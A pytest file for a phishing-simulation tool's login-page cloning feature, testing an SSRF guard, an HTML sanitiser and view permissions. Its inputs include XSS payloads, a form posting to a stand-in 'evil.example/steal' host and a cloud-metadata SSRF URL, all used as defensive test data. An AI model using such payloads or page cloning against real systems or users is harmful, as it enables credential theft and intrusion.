"""
Cloning a login page: the SSRF guard on the address, the allow-list sanitiser on what comes back,
and the view flow (draft, redirect-only edit, re-fetch, permissions). DNS is mocked so these tests
never depend on real network access.
"""

import pytest
from django.contrib.auth.models import Group
from django.urls import reverse

from apps.campaigns.clone import CloneError, sanitize_cloned_html, validate_clone_url
from apps.campaigns.models import LandingDraft
from apps.core.management.commands.setup_groups import Command as SetupGroupsCommand
from apps.engine.tests.fakes import FakePhishingEngineClient

pytestmark = pytest.mark.django_db


def resolves_to(monkeypatch, *addresses):
    """Make DNS resolution deterministic instead of depending on real network access."""
    monkeypatch.setattr(
        "apps.campaigns.clone.socket.getaddrinfo",
        lambda host, port: [(None, None, None, None, (addr, 0)) for addr in addresses],
    )


# --- SSRF guard ----------------------------------------------------------------------------


def test_a_public_address_is_accepted(monkeypatch):
    resolves_to(monkeypatch, "93.184.216.34")

    assert validate_clone_url("https://example.com/login") == "https://example.com/login"


@pytest.mark.parametrize("address", ["127.0.0.1", "10.1.2.3", "192.168.1.1", "172.16.0.5", "169.254.1.1", "::1", "fc00::1"])
def test_an_address_resolving_to_a_private_or_internal_ip_is_refused(monkeypatch, address):
    resolves_to(monkeypatch, address)

    with pytest.raises(CloneError):
        validate_clone_url("https://looks-public.example/login")


@pytest.mark.parametrize("url", ["http://localhost/login", "https://gophish.internal/login", "https://db.corp/x", "https://app.lan/x"])
def test_an_obviously_internal_hostname_is_refused_without_a_dns_lookup(url):
    with pytest.raises(CloneError):
        validate_clone_url(url)


def test_a_direct_private_ip_is_refused_even_with_no_dns_involved():
    with pytest.raises(CloneError):
        validate_clone_url("http://192.168.0.1/login")


@pytest.mark.parametrize("url", ["ftp://example.com", "javascript:alert(1)", "not a url", "", "http://"])
def test_only_http_and_https_urls_are_accepted(url, monkeypatch):
    resolves_to(monkeypatch, "93.184.216.34")

    with pytest.raises(CloneError):
        validate_clone_url(url)


def test_credentials_in_the_address_are_refused(monkeypatch):
    resolves_to(monkeypatch, "93.184.216.34")

    with pytest.raises(CloneError):
        validate_clone_url("https://user:pass@example.com/login")


def test_private_hosts_are_allowed_only_when_explicitly_turned_on(settings, monkeypatch):
    settings.LANDING_CLONE_ALLOW_PRIVATE_HOSTS = True
    resolves_to(monkeypatch, "127.0.0.1")

    assert validate_clone_url("http://127.0.0.1/login") == "http://127.0.0.1/login"


# --- sanitising ----------------------------------------------------------------------------


def test_scripts_and_event_handlers_are_removed():
    html, warnings = sanitize_cloned_html(
        '<html><body><script>alert(document.cookie)</script>'
        '<form action="https://evil.example/steal" method="get" onsubmit="steal()">'
        '<input type="text" name="u" onfocus="evil()"><input type="password" name="p">'
        '<button type="submit">Sign in</button></form></body></html>',
        "https://example.com/",
    )

    assert "<script" not in html and "onsubmit" not in html and "onfocus" not in html
    assert 'method="post"' in html and "evil.example" not in html  # the form action is dropped: it always posts to us
    assert 'type="password"' in html
    assert not any("password field" in w for w in warnings)  # a password field is present: no warning about it missing


def test_frames_objects_and_svg_are_dropped_entirely():
    html, _ = sanitize_cloned_html(
        '<iframe src="https://evil.example"></iframe><object data="x.swf"></object>'
        '<svg onload="alert(1)"><script>alert(2)</script></svg><p>Safe text</p>',
        "https://example.com/",
    )

    assert "<iframe" not in html and "<object" not in html and "<svg" not in html and "onload" not in html
    assert "Safe text" in html


def test_javascript_urls_and_dangerous_css_are_stripped():
    html, _ = sanitize_cloned_html(
        '<a href="javascript:alert(1)">Click</a>'
        '<div style="background:url(javascript:alert(1))">x</div>'
        '<style>body{background:expression(alert(1))}</style>',
        "https://example.com/",
    )

    assert "javascript:" not in html and "expression(" not in html
    assert 'href="#"' in html  # every link becomes inert


def test_relative_resources_are_made_absolute():
    html, _ = sanitize_cloned_html(
        '<link rel="stylesheet" href="/css/site.css"><img src="/img/logo.png" alt="Logo">',
        "https://example.com/login/page",
    )

    assert 'href="https://example.com/css/site.css"' in html
    assert 'src="https://example.com/img/logo.png"' in html


def test_a_data_uri_image_is_kept_but_a_script_uri_image_is_not():
    html, _ = sanitize_cloned_html('<p>x</p><img src="data:image/png;base64,AAAA">', "https://example.com/")
    assert "data:image/png;base64,AAAA" in html

    html2, _ = sanitize_cloned_html('<p>x</p><img src="data:text/html,<script>1</script>">', "https://example.com/")
    assert "<img" not in html2


def test_warns_when_there_is_no_form_or_no_password_field():
    _, no_form = sanitize_cloned_html("<p>Just a page, no form here.</p>", "https://example.com/")
    assert any("No sign-in form" in w for w in no_form)

    _, no_password = sanitize_cloned_html('<form><input type="text" name="u"></form>', "https://example.com/")
    assert any("no password field" in w for w in no_password)


def test_a_page_with_nothing_left_after_sanitising_is_rejected():
    with pytest.raises(CloneError):
        sanitize_cloned_html("<script>alert(1)</script>", "https://example.com/")


def test_an_oversized_page_is_rejected():
    with pytest.raises(CloneError):
        sanitize_cloned_html("<p>" + "x" * 2_000_000 + "</p>", "https://example.com/")


def test_unbalanced_markup_still_produces_well_formed_output():
    html, _ = sanitize_cloned_html("<div><p>unclosed<div>nested</p></span>", "https://example.com/")

    assert html.count("<div>") == html.count("</div>") and html.count("<p>") == html.count("</p>")


# --- view flow -------------------------------------------------------------------------------


def login(client, django_user_model, group="Campaign Manager"):
    SetupGroupsCommand().handle()
    user = django_user_model.objects.create_user(username="u", password="x", is_staff=True)
    user.groups.add(Group.objects.get(name=group))
    client.force_login(user)


@pytest.fixture
def engine(monkeypatch):
    """A fake engine, plus DNS resolution pinned to a public address so "example.com" URLs in these
    tests pass the SSRF guard deterministically, without depending on real network access."""
    fake = FakePhishingEngineClient()
    monkeypatch.setattr("apps.manage.views.get_client", lambda: fake)
    resolves_to(monkeypatch, "93.184.216.34")
    return fake


SAMPLE_PAGE = (
    '<html><body><form method="post"><input type="text" name="u"><input type="password" name="p">'
    '<button type="submit">Sign in</button></form></body></html>'
)


def test_cloning_creates_a_draft_and_pushes_it_to_the_engine(client, django_user_model, engine):
    engine.site_pages["https://example.com/login"] = SAMPLE_PAGE
    login(client, django_user_model)

    response = client.post(reverse("manage:landing-clone"), {"name": "Corp Portal", "url": "https://example.com/login"})

    draft = LandingDraft.objects.get(name="Corp Portal")
    assert response.url == reverse("manage:landing-edit", args=[draft.pk])
    assert draft.layout == LandingDraft.Layout.CLONED and draft.source_url == "https://example.com/login"
    assert 'type="password"' in draft.custom_html
    stored = engine.pages["Corp Portal"]
    assert stored["capture_passwords"] is False and 'type="password"' in stored["html"]


def test_a_page_the_engine_cannot_fetch_saves_nothing(client, django_user_model, engine):
    login(client, django_user_model)

    response = client.post(reverse("manage:landing-clone"), {"name": "Missing", "url": "https://example.com/gone"})

    assert response.status_code == 200 and not LandingDraft.objects.filter(name="Missing").exists()


def test_a_duplicate_name_is_refused(client, django_user_model, engine):
    login(client, django_user_model)
    LandingDraft.objects.create(name="Taken")
    engine.site_pages["https://example.com/login"] = SAMPLE_PAGE

    response = client.post(reverse("manage:landing-clone"), {"name": "Taken", "url": "https://example.com/login"})

    assert response.status_code == 200 and LandingDraft.objects.filter(name="Taken").count() == 1


def test_a_cloned_pages_only_editable_field_is_the_redirect(client, django_user_model, engine):
    login(client, django_user_model)
    engine.site_pages["https://example.com/login"] = SAMPLE_PAGE
    client.post(reverse("manage:landing-clone"), {"name": "Portal", "url": "https://example.com/login"})
    draft = LandingDraft.objects.get(name="Portal")

    edit_page = client.get(reverse("manage:landing-edit", args=[draft.pk])).content.decode()
    assert 'id="id_redirect_url"' in edit_page and 'id="id_heading"' not in edit_page  # only the redirect is editable

    client.post(reverse("manage:landing-edit", args=[draft.pk]), {"name": "Portal", "redirect_url": "https://example.com/thanks"})
    draft.refresh_from_db()
    assert draft.redirect_url == "https://example.com/thanks" and draft.custom_html  # html untouched


def test_fetch_it_again_reruns_the_clone(client, django_user_model, engine):
    login(client, django_user_model)
    engine.site_pages["https://example.com/login"] = SAMPLE_PAGE
    client.post(reverse("manage:landing-clone"), {"name": "Portal", "url": "https://example.com/login"})
    draft = LandingDraft.objects.get(name="Portal")
    engine.site_pages["https://example.com/login"] = SAMPLE_PAGE.replace("Sign in", "Log in now")

    client.post(reverse("manage:landing-edit", args=[draft.pk]), {"action": "reclone"})

    draft.refresh_from_db()
    assert "Log in now" in draft.custom_html


def test_fetch_it_again_re_checks_the_address_not_just_the_original_form(client, django_user_model, engine, monkeypatch):
    """DNS rebinding: an address that was public when first cloned could resolve somewhere internal
    later. "Fetch it again" must re-run the SSRF guard, not skip straight to fetching."""
    login(client, django_user_model)
    engine.site_pages["https://example.com/login"] = SAMPLE_PAGE
    client.post(reverse("manage:landing-clone"), {"name": "Portal", "url": "https://example.com/login"})
    draft = LandingDraft.objects.get(name="Portal")
    original_html = draft.custom_html
    resolves_to(monkeypatch, "10.0.0.5")  # now resolves internally
    engine.site_pages["https://example.com/login"] = SAMPLE_PAGE.replace("Sign in", "Should never appear")

    response = client.post(reverse("manage:landing-edit", args=[draft.pk]), {"action": "reclone"}, follow=True)

    draft.refresh_from_db()
    assert draft.custom_html == original_html  # refused, nothing overwritten
    assert b"internal host" in response.content


def test_view_only_roles_cannot_clone(client, django_user_model, engine):
    login(client, django_user_model, group="Report Viewer")
    engine.site_pages["https://example.com/login"] = SAMPLE_PAGE

    response = client.post(reverse("manage:landing-clone"), {"name": "Portal", "url": "https://example.com/login"})

    assert response.status_code == 403 and not LandingDraft.objects.exists()


def test_an_internal_address_is_refused_before_the_engine_is_ever_called(client, django_user_model, engine):
    login(client, django_user_model)

    response = client.post(reverse("manage:landing-clone"), {"name": "Bad", "url": "http://169.254.169.254/latest/meta-data"})

    assert response.status_code == 200 and not LandingDraft.objects.exists() and not engine.site_pages
